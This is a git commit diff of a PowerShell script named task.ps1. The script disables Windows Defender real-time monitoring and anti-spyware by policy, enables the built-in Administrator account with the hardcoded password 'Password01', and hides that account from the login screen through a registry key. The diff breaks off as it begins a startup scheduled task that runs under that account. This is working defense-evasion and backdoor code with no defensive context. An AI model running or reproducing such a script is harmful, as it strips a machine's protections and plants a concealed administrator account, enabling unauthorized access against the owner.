55331d16953f8b5afa1f302a76ada94347c11090
NoobleMcScrunchkin <kieranaslett@gmail.com>
2019-02-01 12:15:52 +0000

    Update task.ps1

--- task.ps1
+++ task.ps1
@@ -1,20 +1,25 @@
+#Wreck Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $Name = "DisableAntiSpyware"
 $value = "1"
 New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
 
+#Activate Admin and set password
+net user Administrator /active:yes
+net user Administrator Password01
+
+#Add Keys
 New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts"
 New-Item "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 
+#Hide Administrator
 $registryPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $Name = "Administrator"
 $value = "0"
 New-ItemProperty -Path $registryPath -Name $name -Value $value -PropertyType DWORD -Force | Out-Null
 
-net user Administrator /active:yes
-net user Administrator Password01
-
+#Create startup Task
 $Username = (Get-WmiObject -Class Win32_ComputerSystem -Property Name).Name + "\Administrator"
 $Password = "Password01"
 $trigger = New-JobTrigger -AtStartup
